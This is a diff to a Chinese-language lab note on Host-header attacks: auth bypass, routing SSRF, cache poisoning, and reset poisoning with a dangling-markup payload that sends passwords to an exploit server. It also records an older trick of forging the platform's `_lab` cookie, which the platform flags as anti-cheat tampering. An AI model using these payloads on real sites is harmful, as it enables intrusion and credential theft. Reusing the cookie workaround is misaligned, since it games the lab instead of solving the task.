@@ -14,8 +14,8 @@ title: Host 头族:鉴权、路由与缓存
 |---|---|---|---|
 | Host 鉴权 | `/admin` 按 Host 判权 | 覆盖 `Host: localhost` 直达管理面 | HH-1 |
 | Host 路由 SSRF | 前端以 Host 为上游地址 | 遍历 Host 私网段找内网 admin | HH-2 |
-| 请求解析不一致 | 普通 Host 覆盖被 403 拒 | 请求行 absolute-form 与 Host 差异(未解) | HH-3 挂 |
-| 歧义请求缓存投毒 | 页面内嵌 `//<Host>/...` 资源 | 缓存键与后端处理错位(未解) | HH-4 挂 |
+| 请求解析不一致 | 普通 Host 覆盖被 403 拒 | 路由取 **Host 头首个 `:` 前段**;请求行只被校验、不参与路由;平台对本题禁 `_lab` 后 Host 面被实例名 allowlist 锁死(未收口) | [[lab-host-header-ssrf-via-flawed-request-parsing]] |
+| 歧义请求缓存投毒 | 页面内嵌 `//<Host>/...` 资源 | 缓存键与后端处理错位;绝对形/请求行 authority 面批 46 已解(abs_sweep+_lab 钥匙) | HH-4 解 |
 | 密码重置投毒(basic) | 重置邮件链接用 Host 拼绝对 URL | `Host: <exploit>` 发重置 → 读 exploit `/log` 拿 token | [[lab-host-header-basic-password-reset-poisoning]] |
 | 密码重置投毒(dangling markup) | 邮件链接仅 `https://<HOST>/login`,**新密码是邮件正文纯文本** | Host 加**端口**绕过前端按主机名的路由 → 端口后拼 `'><img/src="https://exploit/?`(双引号悬垂吞掉密码) | [[lab-host-header-password-reset-poisoning-via-dangling-markup]] |
 
@@ -59,6 +59,22 @@ title: Host 头族:鉴权、路由与缓存
 - `X-Forwarded-Host` 无反映(响应逐字节相同)。
 - 端口 80 明文被拒(`This lab is not accessible over HTTP`),仅 TLS。
 
+## 实例级 `_lab` 禁令与边缘双层(HH-3 现行实测)
+
+平台给该 lab 加了反作弊:客户端**自供 `_lab` cookie → `400 Client Error: Too Nosy`**(170B,文案「Tampering with the _lab cookie is not required to solve this challenge.」);只发 `session` 或不发 cookie 均 200。
+⇒ 家族旧法(`Host: <内网 IP>` + 爬边缘的 `_lab`)在现行实例上直接失效,这是长臂全 4xx 的根因。
+
+边缘现行两条硬规则(用 Set-Cookie 归因):
+
+| 层 | 规则 | 失败形态 |
+|---|---|---|
+| 预检 1 | `Host` 头 host 段(首个 `:` 前)**必须等于实例主机名**;公开域名(example.com、Collaborator 域名)与私网等价形一律同拒 | 403 109B `Client Error: Forbidden`,**无** Set-Cookie |
+| 预检 2 | 请求行 absolute-form 的 authority:name 形**必须等于实例主机名**;未识别形(百分号编码、`0300.0250.0.0252`、`[::ffff:…]`)放行 | 403 109B 同上,**带** `_lab`(且无 `session`) |
+
+路由归属判据=上游响应体:**靶场前端只用 Host 头 host 段路由**。请求行写内网 IP、十进制/十六进制/短形/尾点、协议相对 `//`、`http:/`、Collaborator 域名,一律回电商 app(404 `"Not Found"` 11B 或首页 10691B),全程无 504、无内网面板;`Host: <实例名>:80@<内网 IP>` 能过预检 1,但前端取首个 `:` 前段 ⇒ 同样回电商 app(以不可路由 IP `10.0.0.1` 做对照证实)。
+
+⇒ 现行实例可达面盘点:HOST 段被实例名 allowlist 锁死、请求行不参与路由、无转发头 fallback(`X-Forwarded-Host`/`Forwarded`/`X-Forwarded-Server` 均不生效)、重复 Host(含大小写/`Host ␣` 变体)400、h2 的 `Host` 覆盖 `:authority` 与双 `:authority` 均 `GOAWAY`、连接复用第二帧无响应(每响应后关连接)。旧实录的 `_lab` 配方只适用于反作弊上线前的实例。
+
 ## 前端指纹(两条 lab 共用)
 
 - **校验**≈`Host.split(':')[0] == <本实例主机名>`:端口段自由(`Host: <lab>:abc` 仍到 app);`@` 出现在冒号前 → 403
@@ -79,17 +95,18 @@ title: Host 头族:鉴权、路由与缓存
 - 边缘层在 app 之前就把畸形形状规范化掉:重复 Host(含大小写变体/HTTP/1.0/裸 LF/CR)→ 400,obs-fold(缩进 Host)→ 缩进行被丢,
   `Host ` / `Host\t`(冒号前空白)能过重复检查但 app 直接忽略 ⇒ 想用“两个不同 Host”造语法分歧,得先确认边缘不先规范化。
 - h2:边缘支持 h2、按 `:authority` 路由;**大写 `Host` 可覆盖 `:authority` 参与路由**;`host` 与 `:authority` 不一致 → `RST_STREAM`;
-  某些 lab 的 `:authority: <lab>` 会 400 `Invalid request`(该题在 h2 下不可达)。
+  某些 lab 的 `:authority: <lab>` 会 400 `Invalid request`(该题在 h2 下不可达);HH-3 现行实例上 `Host` 覆盖 `:authority`、大写 `Host`、双 `:authority` 三种形均回 `GOAWAY`(17B),h2 面无口。
 
 ## 工具面
 
 - `header_scan`:单个请求头按 FUZZ 区间/清单遍历,回命中与长度簇(找内网 admin IP)。
 - `raw_http`:字节级 HTTP/1.1(自定义请求行 absolute-form/畸形 Host、重复头、FUZZ 遍历、TLS、输出响应头)。
 - `lab_page`(剥题解侦察)、`lab_http`、`lab_launch`、`solved_check`。
+- 现行件:`raw_matrix`(多变体一发一独立连接,回状态/字节/digest/Set-Cookie 名,用于层界归因)、`conn_reuse`(字节级连发 + 全响应头)、`h2_req`(h2 原帧与伪头控制)、`burp_collab`(出网腿)。
 
 ## 实录溯源
 
-- [[lab-host-header-authentication-bypass]]、[[lab-host-header-routing-based-ssrf]]、[[lab-host-header-ssrf-via-flawed-request-parsing]](挂)、[[lab-host-header-web-cache-poisoning-via-ambiguous-requests]](挂)、[[lab-host-header-basic-password-reset-poisoning]]
+- [[lab-host-header-authentication-bypass]]、[[lab-host-header-routing-based-ssrf]]、[[lab-host-header-ssrf-via-flawed-request-parsing]](旧 `_lab` 法,现行实例被反作弊禁用)、[[lab-host-header-web-cache-poisoning-via-ambiguous-requests]](挂)、[[lab-host-header-basic-password-reset-poisoning]]
 
 ## 相关族
 
@@ -99,3 +116,13 @@ title: Host 头族:鉴权、路由与缓存
 ## Links
 
 - evidences: [[academy-edge-lab-cookie-gate]]
+
+## 路由与缓存消费者(grok 先例线)
+
+- 路由型 SSRF 第一步是先证「这个 Host 真被拿去连」(OOB 回调),再扫 `192.168.0.0/24`;顺序反了会把「拒绝」误判成「不通」。
+- 缓存键分叉的第二 Host 消费者:重复 Host 的第二个值被写进脚本绝对 URL 时,第一个 Host 仍是缓存键——证据是 `X-Cache` miss 变 hit 且受害者键上出现攻击者脚本源;绝对形式请求行是另一种同构分叉。
+- 连接态绕过(首条合法后连接放行毒 Host):关键变量是**边缘墙要求的 lab 会话 cookie**(带上后,同 TCP 连接先合法 Host 紧接毒 Host 即放行;实测破此前「rustls 指纹不过边缘」的悲观判);Burp 形是单连接顺序发组。
+
+## 族地板带
+
+- host 族四数据点:19(auth-bypass 冒烟)/71(connection-state 实解 not-smoke)/34(routing-ssrf 深水)/47(flawed-parsing 深水,平台反作弊硬阻断);解面 19-71 跨冒烟与四台环,深水面挂死属 runner/环境口径非族带。
